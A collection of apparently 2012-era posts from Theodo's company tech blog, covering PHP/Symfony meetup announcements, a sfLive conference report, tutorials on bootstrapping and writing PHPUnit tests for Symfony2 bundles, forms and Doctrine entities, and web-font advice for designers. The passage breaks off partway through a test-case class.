{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis Thursday 12/07, the French Association of Php Users (AFUP) holds a meeting\u00a0in Paris, sponsored by Theodo.\nJulien Pauli (Software Architect & Lead Developper at Comuto) and Hugo Hamon (Trainings Manager & Symfony2 Developer at Sensio Labs), will discuss design-patterns and anti-patterns in PHP.\u00a0\u00a0Moreover, Fabrice Bernhard will finish the conference by speaking about his own experience with design patterns. No spoiler here. ;-]\nAfter the presentations, we will \u00a0have a drink and eat some snacks all together.\nYou can read more infos and should subscribe here:\u00a0http://www.afup.org/pages/rendezvous/index.php.\nWe hope to see you tonight!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRemy Luciani\r\n  \t\t\t\r\n  \t\t\t\tTheodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. \r\n\r\n\"The Prod is life!\"  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTime for a short (and somewhat late) report about the main event for the Symfony (and PHP) community in Paris and of course for us at Theodo: sfLive, which we sponsored and attended.\nSfLive gathered around 600 people this year. On the whole the organization was great, with only one minor issue: the secondary rooms were sometimes a bit too small for the audience. Which is, in a way, a consequence of the success of the event.\nIn his keynote, Fabien Potencier emphasized the importance of the community revolving around Symfony, and its continuous growth. Concerning Symfony2 news, the first Symfony2 certifications many had been waiting for were announced. Those hoping to hear the announcement of the 2.1 version of Symfony would have to wait some more though (but not too much: the beta version was officially released two weeks later!).\nThe conferences were globally of high quality, with some nice surprises, particularly in some very loosely Symfony2-related topics like John Clevely\u2019s How we built the new responsive BBC News site, that I luckily attended because its schedule was exchanged with the previous conference. Very informative talk however about the answers they found to the multiplicity of devices connecting to the BBC site. Basically they chose to separate between two categories of users: those with low capacity devices, for whom the core elements will still be available, and the ones for whom an enhanced user experience is possible.\nTalks ranged from specific technologies, either Symfony related or not too much (like Jeremy Mikola\u2019s using MongoDB responsibly), to use cases like the BBC\u2019s one or the wetter.de example that dealt with performance issues, cache and ESI, and a bit of good practices (David Zuelke\u2019s Designing HTTP Interfaces and RESTful web services or why most self-called \u201cREST API\u201d are actually, well, just APIs).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Henri Cumenge\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\n\u00a0\nPour lancer la saison 2012-2013 des meetups Paris-Devops, Theodo organise la 10\u00e8me rencontre des devs et des ops dans ses nouveaux locaux le 10 octobre 2012.\u00a0Orient\u00e9 plut\u00f4t langage, la th\u00e9matique de ce meetup sera PHP-Python-Ruby-Perl.\nPour assister aux pr\u00e9sentations puis boire une bi\u00e8re pression avec les membres de la communaut\u00e9 devops inscrivez vous http://parisdevops-10.eventbrite.com. Il y aura beaucoup plus de places que la premi\u00e8re fois \nVous pouvez \u00e9galement proposer vos sujets de conf\u00e9rence si vous voulez intervenir sur la mailing list paris-devops@googlegroups.com.\nDonc pour r\u00e9sumer :\nParis-Devops #10 le 10 octobre 2012 \u00e0 partir de 19h chez Theodo, PHP-Python-Perl-Ruby-Bi\u00e8re\nInscriptions : http://parisdevops-10.eventbrite.com\nCall for papers : https://groups.google.com/d/topic/paris-devops/_2BEpNca_y0/discussion\nAdresse : 48 Boulevard des Batignolles 75017 Paris\nM\u00e9tros :\n\nligne 2, Rome\nligne 13, Place de Clichy\nligne 3, Europe\nligne 12 et 14, Saint-Lazare (+10min \u00e0 pied)\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you want to create an independent Symfony2 bundle, unit test are a must. Not only are they a good practice but they also help a lot with a day-to-day developpement work. There\u2019s one problem though \u2013 how do you bootstrap them when the bundle is not in a project?\nA bootstrap file is needed to create the test environement. When you are creating basic unit tests, all you really need is an autoloader that will load all your dependencies. You will need to have them defined first, but I trust that you already have a composer.json file in your project.\nActually composer can do everything you need \u2013 you can use the composer install command in the bundle itself to download all the needed components and use composer\u2019s autoload file as a bootstrap.\nHere is a sample phpunit.xml.dist configuration:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<phpunit\r\n    bootstrap = \"./vendor/autoload.php\" >\r\n\r\n    <testsuites>\r\n        <testsuite name=\"Project Test Suite\">\r\n            <directory>./Tests</directory>\r\n        </testsuite>\r\n    </testsuites>\r\n\r\n    <filter>\r\n        <whitelist>\r\n            <directory>./</directory>\r\n            <exclude>\r\n                <directory>./Resources</directory>\r\n                <directory>./Tests</directory>\r\n            </exclude>\r\n        </whitelist>\r\n    </filter>\r\n\r\n</phpunit>\nSometimes you may need a more refined environement setup. You can easily create a bootstrap file while still using the composer autoloader. Just change the bootstrap in PHPUnit configuration to ./Test/bootstrap.php and add all you need there.\nHere is a sample Test/bootstrap.php file:\n<?php\r\nif (!is_file($autoloadFile = __DIR__.'/../vendor/autoload.php')) {\r\n    throw new \\LogicException('Run \"composer install --dev\" to create autoloader.');\r\n}\r\n\r\nrequire $autoloadFile;\r\n\r\n// Your custom configuration\nThere is one thing here that is worth emphasizing \u2013 the --dev option in composer. It tells composer to install packages defined in \u201crequire-dev\u201d section. This sections lets you define dependencies required only while developing. A good example is your prefered mock library \u2013 the users will not run the tests, so they don\u2019t care for it, but you do need it.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article has been transformed into a Symfony Cookbook article. Please, refer to it as it is now maintained by the community and will  surely be more up to date. The post below is kept for archiving purposes.\nIt has already been some time since I started working according to the TDD methodology.\nSometimes it is really challenging, because you need to find out how to test certain\nframework components you\u2019re extending. One of these components is the form component.\nFinding how to test forms properly took me a while, so I would like to share what I learned.\nBefore starting to code I will explain what and why we test.\nThe form component itself consists of 3 classes: the FormType, the Form and the FormView.\nThe only class that is usually handled by programmers is the Type class which serves\nas a form blueprint. It is used to generate the Form and the FormView. We\ncould test it directly, by mocking its interactions with the factory but it would be too\ncomplicated with little gain. What we should do instead is to pass it to FormFactory\nlike it is done in real application. It is simple to bootstrap and we trust Symfony\ncomponents enough to use them as a testing base.\nThere is actually an existing class that we can benefit from for simple FormTypes testing,\nthe Symfony\\Component\\Form\\Tests\\Extension\\Core\\Type\\TypeTestCase class. It is used to\ntest the core types and you can use it to test yours too.\n\nThe basics\nThe simplest TypeTestCase implementation looks like this:\n\n\r\n<?php\r\n\r\nnamespace Acme\\TestBundle\\Tests\\Form\\Type;\r\n\r\nuse Acme\\TestBundle\\Form\\Type\\TestedType;\r\nuse Acme\\TestBundle\\Model\\TestObject;\r\nuse Symfony\\Component\\Form\\Tests\\Extension\\Core\\Type\\TypeTestCase;\r\n\r\nclass TestedTypeTest extends TypeTestCase\r\n{\r\n    public function testBindValidData()\r\n    {\r\n        $formData = array(\r\n            'test' => 'test',\r\n            'test2' => 'test2',\r\n        );\r\n\r\n        $type = new TestedType();\r\n        $form = $this->factory->create($type);\r\n\r\n        $object = new TestObject();\r\n        $object->fromArray($formData);\r\n\r\n        $form->bind($formData);\r\n        $this->assertTrue($form->isSynchronized());\r\n\r\n        $this->assertEquals($object, $form->getData());\r\n\r\n        $view = $form->createView();\r\n        $children = $view->children;\r\n\r\n        foreach (array_keys($formData) as $key) {\r\n            $this->assertArrayHasKey($key, $children);\r\n        }\r\n    }\r\n}\r\n\n\nSo, what does it test? I will explain it line by line.\n\n\r\n$type = new TestedType();\r\n$form = $this->factory->create($type);\r\n\n\nThis will test if your FormType compiles to a form. This includes basic class inheritance,\nthe buildForm function and options resolution. This should be the first test you write.\n\n\r\n$form->bind($formData);\r\n$this->assertTrue($form->isSynchronized());\r\n\n\nThis test checks if none of your DataTransformers used by the form failed. The\nisSynchronized is only set to false if a DataTransformer throws an exception. Note that we\ndon\u2019t check the validation \u2013 it is done by a listener that is not active in the test case\nand it relies on validation configuration. You would need to bootstrap the whole kernel to do it.\nWrite separate TestCases to test your validators.\n\n\r\n$this->assertEquals($object, $form->getData());\r\n\n\nThis one verifies the binding of the form. It will show you if any of the fields were\nwrongly specified.\n\n\r\n$view = $form->createView();\r\n$children = $view->children;\r\n\r\nforeach (array_keys($formData) as $key) {\r\n    $this->assertArrayHasKey($key, $children);\r\n}\r\n\n\nThis one specifies if your views are created correctly. You should check if all widgets\nyou want to display are available in the children property.\n\n\nThe tricks\nThe test case above works for most of the forms, but you can actually have few issues\nif you\u2019re doing something a bit more sophisticated.\n\n1. If your form uses a custom type defined as a service\n\n\r\n<?php\r\n\r\n// FormType buildForm\r\n$builder->add('acme_test_child_type');\n\nYou need to make the type available to the form factory in your test. The easiest way is\nto register it manually before creating the parent form:\n\n\r\n<?php\r\n$this->factory->addType(new TestChildType());\r\n\r\n$type = new TestedType();\r\n$form = $this->factory->create($type);\n\n\n\n2. You use some options declared in an extension.\nThis happens often with ValidatorExtension (invalid_message is one of those options). The\nTypeTestCase loads only the core Form Extension so an \u201cInvalid option\u201d exception will\nbe raised if you try to use it for testing a class that depends on other extensions. You need to\nadd them manually to the factory object:\n\n\r\nclass TestedTypeTest extends TypeTestCase\r\n{\r\n    protected function setUp()\r\n    {\r\n        parent::setUp();\r\n\r\n        $this->factory = Forms::createFormFactoryBuilder()\r\n            ->addTypeExtension(new FormTypeValidatorExtension($this->getMock('Symfony\\Component\\Validator\\ValidatorInterface')))\r\n            ->addTypeGuesser(\r\n                $this->getMockBuilder('Symfony\\Component\\Form\\Extension\\Validator\\ValidatorTypeGuesser')\r\n                    ->disableOriginalConstructor()\r\n                    ->getMock()\r\n            )\r\n            ->getFormFactory();\r\n\r\n        $this->dispatcher = $this->getMock('Symfony\\Component\\EventDispatcher\\EventDispatcherInterface');\r\n        $this->builder = new FormBuilder(null, null, $this->dispatcher, $this->factory);\r\n    }\r\n\r\n    /** your tests */\r\n}\r\n\n\n\n\n3. You want to test against different sets of data.\nIf you are not familiar yet with PHPUnit\u2019s data providers it would be a good opportunity to\nuse them:\n\n\r\nclass TestedTypeTest extends TypeTestCase\r\n/**\r\n * @dataProvider getValidTestData\r\n */\r\npublic function testForm($data)\r\n{\r\n    /**\r\n     * Do your tests\r\n     */\r\n}\r\n\r\npublic function getValidTestData()\r\n{\r\n    return array(\r\n                array(\r\n                    'data' => array(\r\n                        'test' => 'test',\r\n                        'test2' => 'test2',\r\n                    ),\r\n                ),\r\n            array(\r\n                    'data' => array(\r\n                    ),\r\n                ),\r\n                array(\r\n                    'data' => array(\r\n                        'test' => null,\r\n                        'test2' => null,\r\n                    ),\r\n                ),\r\n            );\r\n}\r\n\n\nThis will run your test three times with 3 different sets of data. This allows for\ndecoupling the test fixtures from the tests and easily testing against multiple sets of\ndata.\nYou can also pass another argument, such as a boolean if the form has to be synchronized with\nthe given set of data or not etc.\nHope these tips will be helpful!\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tJust after two major PHP events (Forum PHP and sfLive in Paris) we met once again during AFSY\u2018s monthly sfPot. Last Tuesday (June 12) it was @LaNetscouade that invited us to their offices.\nThis time Theodo prepared the presentation. We \u2013 Benjamin Grandfond and me \u2013 introduced the participants to\u00a0TheodoRogerCmsBundle. The bundle helps you to incorporate basic CMS features into your project, integrating easily with existing applications and letting you keep control of what content the user can modify. See https://speakerdeck.com/u/benjam1/p/theodorogercmsbundle for\u00a0slides.\nAfter the talk and a bit of discussion concerning the project, we went to\u00a0Saint Patricks pub and spent the evening discussing the last news\u00a0in Symfony community and some less formal topics.\nStay tuned for the next sfPot event.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe upcoming week will be really busy as two main conferences for the french PHP community will take place in Paris.\nFirst the Forum PHP organized by AFUP from Tuesday to Wednesday\u00a0at Cit\u00e9 universitaire. Going there you will meet many French PHP experts and among them Theodo which sponsors the event. As every year Fabrice and some members of the team will attend to the conferences over the two days. PHP, continuous integration, testing, Varnish, Postgres, MySQL, and many other topics will be raised during the two days.\nRight after the Forum PHP, the Symfony Live will follow in the same place. And again Theodo sponsors the event and you may meet us there. Like previous editions this one looks promising, especially since so much is going on around Symfony lately.\nA huge program for PHP developers this week, but it is not finished. Marek and I will present the RogerCMS bundle at La Netscouade on Tuesday 12th. This conference is organised by AFSY and there are not many places available so be sure to register before. And if you cannot come, you can still come drink beer with us at Patrick\u2019s Pub.\nHope to see you there !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nFont usage on the web is a critical matter. Well I guess it\u2019s critical while working with other media too, but if you\u2019re a graphic designer and you\u2019re not that familiar with the best practices of website creation, you might come up with something rude to web designers, be it beautiful or not.\nThe #1 thing to keep in mind is that text is the core of most websites. In fact, websites are often comparable to newspapers since both media feature categorized articles, with headings, paragraphs, etc. In short: information.\nInformation also consists of images but here comes rule #2: information must be accessible to anyone. And while text can be accurately reproduced as sound by software known as screen readers (Jaws, Orca, etc.), images can not. Thus, for the blind to access the information transmitted through images we add an \u201calternative\u201d text description to them, but it\u2019s often limited. We could also put on a more complete description and then hide it to users who can see the image, yet that may require additional work.\nChoosing the right fonts\nWhy, if today\u2019s topic is \u201cFonts\u201d, am I talking about images? Simply because in order to reproduce some fancy fonts on the web, we have no choice but to use images. Yes, a title reading \u201cMy Awesome Website\u201d rendered using a font by Ray Larabie in Adobe Photoshop will not be displayed the same on the end user\u2019s browser if it can\u2019t find the exact same font on the computer.\nSolutions? Sure, there are several, as can be seen in this article by Shaun Cronin.To sum up:\n\nsome solutions require additional javascript (that impaired users might disable)\nothers require Adobe Flash (heavy, and disabled by even more people)\nmost make use of the @font-face property, which is somewhat new and won\u2019t work with obsolete browsers still in use (think Internet Explorer < 9)\nthe old and dirty solution: using images, meaning that you have to make a new image for every element in each language, and change them all everytime you want to modify the wording. Plus, it won\u2019t resize nicely and need intelligent text alternatives\n\nIn addition, Google and other search bots love real text that you can copy/paste so if the text is rendered via an image or a flash object, most of the time these bots won\u2019t catch and index the information\u2026 not very SEO friendly.\nTherefore I\u2019m sorry to say that (at least until IE 6, 7 and 8 are all below 5% in usage statistics) the best thing to do is to find elegant ways to integrate standard fonts, also referred to as web safe fonts. They simply are the most common fonts to be expected on everybody\u2019s computer. In that bunch you\u2019ll find Arial, Times New Roman, Courier New, then Verdana, and to a lesser extent Georgia, Impact, and some other native Microsoft fonts (sadly\u2026).\nAlso, you know that fonts can be sorted in 3 categories: serif, sans-serif and monospace fonts.\nThis is important because web developers/designers will call fonts like this:\nfont-family: helvetica, arial, sans-serif;\nIf the font \u201chelvetica\u201d is not found, then it will search for \u201carial\u201d, and again, if it\u2019s nowhere to be found then it will use the default sans-serif font defined by the browser. Therefore we must ALWAYS list at least 2 fonts: the desired one and the default font type. 3 is better.\nSo, in addition to working with a limited set of standard fonts, I advise graphic designers to make sure that their layout doesn\u2019t fall apart when switching the font to Arial (a good default sans-serif font) or Times New Roman (a good default serif font). Monospace fonts are mainly used to display code so you should not have to use them a lot, but if you do, then Courier New is a good default monospace font.\nIf you really need a fancy font, then I would recommend choosing one from Google Web Fonts and/or to provide the said font files along with the rest of your work.\nThat\u2019s all for the choice of fonts \u2013 the big part actually, but there\u2019s more to talk about.\nStyling your fonts\nBecause a font is not only a \u201cfont-family\u201d affair, it\u2019s also about the size, the color, the style you give your font.\nA rather complete font declaration by a web designer would look like this:\nfont-family: helvetica, arial, sans-serif;\r\nfont-style: bold;\r\nfont-size: 12px;\r\nline-height: 16px;\r\ntext-transform: uppercase;\r\ncolor: #000000;\nOr in a more compact way:\nfont: bold 12px/16px helvetica, arial, sans-serif;\r\ntext-transform: uppercase;\r\ncolor: #000000;\nOne thing you don\u2019t see here because it doesn\u2019t really exist in the web world but does in Photoshop is the anti-aliasing setting (None, Sharp, Crisp, Strong, Smooth). Therefore, I beg you not to use different anti-aliasing levels and to keep it to the Crisp level.\nNow, 2 things are important, mainly in order to grant the website a sufficient accessibility level:\n\nconsistency\nreadibility\n\nConsistency means that elements that are to be found in different pages should be identical. For fonts, it implies for instance that the title of the page is always at the same place, using the same font at the same size, with the same color, etc.\nAt times you may need to lower the size to be able to insert a longer title in the same area. Should this happen, either change all titles or find another solution because this one is not acceptable. Also, you should always take into account this situation where a title or any other text variable could expand beyond the limit of its container, and suggest a solution (such as truncation).\nTo ensure more visual consistency, please limit yourself to 3 or 4 different font declarations.\nAll these measures help in not confusing readers and thus improve the readibility of the site. We can do more by making sure the text is actually visible to everyone (rule #2), and this time I\u2019m talking about people who are not blind but still suffer from troubled vision.\nFor these people, we should ensure that the font size is not ridiculously small (in pixels, I would set the limit to 9) and the contrast between the text and the background is strong enough. There are precise recommendations established by the W3C addressing this concern. And hopefully a lot of tools allow you to check the validity of the chosen colors, such as Colour Contrast Check by Jonathan Snook.\nLinks are also interesting. One should be able to distinguish a link just by looking at the text, with no need to hover the mouse to find them. To achieve this, it is recommended to apply a different color to links AND to underline them.Alterations in size or style (bold and italic) are to be avoided since these distinctions can apply to normal text as well, with a proper meaning.\nAnother thing is the letter case. You need not write titles directly in uppercase and should use the \u201cAll Caps\u201d transformation in the Character tool panel in Photoshop instead. That\u2019s also what web designers do thanks to the \u201ctext-transform\u201d property. This way, we can copy/paste content text in readable form \u2013 the real content being the unformatted text, the switch to capital letters is only part of the style, the decoration. Plus, this kind of transformation preserve accents, if needed.\nVisualize the site like end users would\nLast and not so trivial, I know some of you are crazy about Apple products. It doesn\u2019t matter what my opinion on these are, but it can lead to confusion and frustration since you might present your work to the client, and they will be enthustatic about it \u2013 that\u2019s cool. But then we present them with the web rendition of your mockups and they don\u2019t understand why the scrollbars are so ugly compared to what they had seen on the static pages you designed \u2013 showing Safari Mac like scrollbars.Same for fonts, that are notoriously \u201cbolder\u201d on a Mac than they are on Linux or Windows \u2013 the OS the client and the end users are most expected to use (and thus why you shouldn\u2019t never use the confusing \u201cStrong\u201d anti-aliasing).\nSo when dealing with fonts, you should preferably:\n\nchoose standard fonts\nillustrate what happens with shorter/longer text\nbe consistent\nmake it readable\n\nI am well aware that the points I make in this article can be regarded as restrictive to your creative spirit but please do not think of them as constraints, they\u2019re meant as guidelines to a more efficient and \u201cweb ready\u201d layout, for the World Wide Web to a better place for everyone \n\n\n#content #because-we-need-to-redo-the-blog\n{\n  line-height: 20px;\n}\n#content #because-we-need-to-redo-the-blog .conclusion\n{\n  margin-top: 50px;\n}\n#content #because-we-need-to-redo-the-blog h4\n{\n  margin-top: 25px;\n}\n#content #because-we-need-to-redo-the-blog h4,\n#content #because-we-need-to-redo-the-blog p,\n#content #because-we-need-to-redo-the-blog pre,\n#content #because-we-need-to-redo-the-blog ul\n{\n  margin-bottom: 15px;\n}\n#content #because-we-need-to-redo-the-blog li\n{\n  margin-bottom: 10px;\n}\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyrille Jouineau\r\n  \t\t\t\r\n  \t\t\t\tCyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nToday I will explain how to test your entities in a Symfony2 and Doctrine2 project.\n\nTo achieve our work, we will work on a location model which will look somewhat like this:\n\n\r\nLocation:\r\n- address: string, required\r\n- zip code: string, required\r\n- city: string, required\r\n- country: string, required\r\n\nTest Driven Development\nIn the test driven development (TDD) world, a best practice is to start writing your test case before writing any code. So we will write our test case in the Tests/Entity folder of our bundle:\n\r\n/**\r\n * Location class test\r\n *\r\n * @author Benjamin Grandfond \r\n * @since 2011-07-16\r\n */\r\nnamespace ParisStreetPingPong\\Bundle\\PsppBundle\\Entity;\r\n\r\nclass LocationTest extends \\PHPUnit_Framework_TestCase\r\n{\r\n    protected $location;\r\n\r\n    public function setUp()\r\n    {\r\n        parent::setUp();\r\n\r\n        $this->location = new Location();\r\n    }\r\n\r\n    public function testGetAddress()\r\n    {\r\n        $address = '80 Rue Curial';\r\n\r\n        $this->location->setAddress($address);\r\n\r\n        $this->assertEquals($address, $this->location->getAddress());\r\n    }\r\n}\nNote that the aim of this blog post is not to write a test case that covers 100% of the code, but show how to to write a database test case easily.\nOnce your test is written, if you run it it should not pass; don\u2019t worry, we will write the code to make it work \ud83d\ude09 Instead of manually creating a file as you would usually do, you can use PHPUnit! It handles the creation of classes from the test case:\n$ phpunit --skeleton-class src/Theodo/Bundle/MyBundle/Tests/Entity/LocationTest.php\n\nThis will generate your Location.php class in the same folder as the LocationTest.php file, you only need to move it to the Entity folder of your bundle. The tree of your application should look like:\n\n\r\nsrc/Theodo/Bundle/MyBundle\r\n|-- Entity\r\n|  |-- Location.php\r\n|-- Tests\r\n|  |-- Entity\r\n|  |  |-- LocationTest.php\r\n\nAnd your Location.php should already contains some code :\n\r\n\n\nSo now, you only need to add properties with Doctrine annotations! I recommended against using the YAML or XML formats to describe your model because, when you will generate your getters and setters, Doctrine will append properties and methods to the existing source, so you will have to copy/paste a lot to clean up the code\u2026\n\nFinally, your class should look like this:\nnamespace Theodo\\Bundle\\MyBundle\\Entity;\r\n\r\nuse Doctrine\\ORM\\Mapping as ORM;\r\n\r\n/**\r\n * @ORM\\Entity\r\n * @ORM\\Table(name=\"location\")\r\n */\r\nclass Location\r\n{\r\n    /**\r\n     * @ORM\\Id\r\n     * @ORM\\Column(type=\"integer\")\r\n     * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n     */\r\n    protected $id;\r\n\r\n    /**\r\n     * @ORM\\Column(type=\"string\")\r\n     */\r\n    protected $address;\r\n\r\n    /**\r\n     * @ORM\\Column(type=\"string\", length=\"7\", name=\"zip_code\")\r\n     */\r\n    protected $zipCode;\r\n\r\n    /**\r\n     * @ORM\\Column(type=\"string\")\r\n     */\r\n    protected $city;\r\n\r\n    /**\r\n     * @ORM\\Column(type=\"string\")\r\n     */\r\n    protected $country;\r\n\r\n    /**\r\n     * Set $address\r\n     *\r\n     * @param string $address\r\n     */\r\n    public function setAddress($address)\r\n    {\r\n        $this->address = $address;\r\n    }\r\n \r\n    /**\r\n     * Get $address\r\n     *\r\n     * @return String\r\n     */\r\n    public function getAddress()\r\n    {\r\n\r\n        return $this->address;\r\n    }\r\n}\nActually, this sample does not prove the real utility of the skeleton class generation with PHPUnit because the class could have been generated with Doctrine generate entities command, but you can use it with a class which does not deal with Doctrine.\nIf you launch your test now it should pass, but we didn\u2019t do anything that needs the database. So I will add a $localization property to the Location class which will contain the full address.\n\r\n// MyBundle\\Entity\\Location\r\n\r\n/**\r\n * @ORM\\Entity\r\n */\r\nclass Location\r\n{\r\n ...\r\n/**\r\n * @ORM\\Column(type=\"text\", nullable=\"true\")\r\n */\r\nprotected $localization;\r\n\r\n...\r\n}\nNow we will complete our Location test, and after we will implement the generateLocalization() which should be called on the prePersist event.\nConfiguration\nThe first thing you must do when you run a test that use database insertion with Symfony2 and Doctrine2, is to set up the database connection. To do so, you have configure the doctrine DBAL handling the connection in the config_test.yml file:\nimports:\r\n    - { resource: config_dev.yml }\r\n\r\nframework:\r\n    test: ~\r\n    session:\r\n        storage_id: session.storage.filesystem\r\n\r\nweb_profiler:\r\n    toolbar: false\r\n    intercept_redirects: false\r\n\r\nswiftmailer:\r\n    disable_delivery: true\r\n\r\ndoctrine:\r\n    dbal:\r\n        driver:       sqlite\r\n        host:         localhost\r\n        dbname:    db_test\r\n        user:         db_user\r\n        password: db_pwd\r\n        charset:     UTF8\r\n        memory:    true\nSo, to run our tests, we will use SQLite in memory. While you are free to use something else, it will not be as efficient and easy to setup. Also you won\u2019t need to use transactions to revert the data as they were before the test, you can delete anything and recreate it very quickly.\nPHPUnit test case\nNow that the configuration is done, you will use the kernel of your Symfony2 application which will load this configuration,  Doctrine and the full application. We will do this in another class that must be abstract to not being considered as a test case by PHPUnit. It will also allow us to use it anytime we need to test something with databases interactions.\n/**\r\n * TestCase is the base test case for the bundle test suite.\r\n *\r\n * @author Benjamin Grandfond\r\n * @since  2011-07-29\r\n */\r\n\r\nnamespace ParisStreetPingPong\\PsppBundle\\Tests;\r\n\r\nrequire_once dirname(__DIR__).'/../../../../app/AppKernel.php';\r\n\r\nuse Doctrine\\ORM\\Tools\\SchemaTool;\r\n\r\nabstract class TestCase extends \\PHPUnit_Framework_TestCase\r\n{\r\n    /**\r\n     * @var Symfony\\Component\\HttpKernel\\AppKernel\r\n     */\r\n    protected $kernel;\r\n\r\n    /**\r\n     * @var Doctrine\\ORM\\EntityManager\r\n     */\r\n    protected $entityManager;\r\n\r\n    /**\r\n     * @var Symfony\\Component\\DependencyInjection\\Container\r\n     */\r\n    protected $container;\r\n\r\n    public function setUp()\r\n    {\r\n        // Boot the AppKernel in the test environment and with the debug.\r\n        $this->kernel = new \\AppKernel('test', true);\r\n        $this->kernel->boot();\r\n\r\n        // Store the container and the entity manager in test case properties\r\n        $this->container = $this->kernel->getContainer();\r\n        $this->entityManager = $this->container->get('doctrine')->getEntityManager();\r\n\r\n        // Build the schema for sqlite\r\n        $this->generateSchema();\r\n\r\n        parent::setUp();\r\n    }\r\n\r\n    public function tearDown()\r\n    {\r\n        // 